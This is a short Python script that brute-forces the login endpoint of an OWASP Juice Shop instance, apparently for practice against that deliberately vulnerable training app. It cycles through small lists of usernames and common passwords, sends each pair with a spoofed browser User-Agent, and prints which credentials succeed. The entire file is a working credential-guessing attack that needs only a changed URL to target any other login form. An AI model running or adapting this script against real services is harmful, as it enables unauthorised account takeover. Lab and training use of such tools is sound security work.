import requests
import time

url = "https://juice-shop.herokuapp.com/rest/user/login"

users = ["admin", "user", "test"]
passwords = ["admin", "password", "123456"]

with requests.Session() as session:
    session.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123"}

    def brute_force_user_login(user, password):
        data = {"email": user, "password": password}

        try:
            response = session.post(url, json=data)

            if response.status_code == 200:
                print(f"Successful login with user: {user} and password: {password}")
                return True
            elif response.status_code == 401:
                print(f"Failed login attempt with user: {user} and password: {password}")
        except requests.exceptions.RequestException as e:
            print(f"Exception occurred: {e}")

        return False

    successful_login = False
    for user in users:
        for password in passwords:
            if brute_force_user_login(user, password):
                successful_login = True
                time.sleep(1)  # Adding a delay for each login attempt
                break

    print("Brute force complete. Successful login: ", successful_login)
